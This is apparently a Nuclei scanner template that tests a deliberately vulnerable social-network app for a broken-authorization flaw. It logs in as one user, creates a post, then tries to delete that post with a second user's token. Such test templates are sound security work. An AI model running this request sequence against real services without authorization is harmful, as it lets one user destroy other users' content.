id: vuln-sns-posts-delete-authorization-bypass
info:
  name: Vuln SNS Posts Delete - Authorization Bypass
  author: claude
  severity: high
  description: |
    Tests if users can delete posts created by other users.
  reference:
    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/
  tags: vuln-sns,authorization,posts-delete

http:
  - raw:
      - |
        POST /api/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"user_id":"bob","password":"bob"}
        
      - |
        POST /api/posts HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Authorization: Bearer {{bob_token}}
        
        {"content":"Bob's post to be deleted"}
        
      - |
        POST /api/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"user_id":"alice","password":"alice"}
        
      - |
        DELETE /api/posts/{{post_id}} HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{alice_token}}

    extractors:
      - type: regex
        name: bob_token
        regex:
          - '"token":\s*"([^"]+)"'
        part: body_1
        internal: true

      - type: regex
        name: post_id
        regex:
          - '"id":\s*(\d+)'
        part: body_2
        internal: true

      - type: regex
        name: alice_token
        regex:
          - '"token":\s*"([^"]+)"'
        part: body_3
        internal: true

    matchers:
      - type: word
        words:
          - "Post deleted successfully"
        part: body_4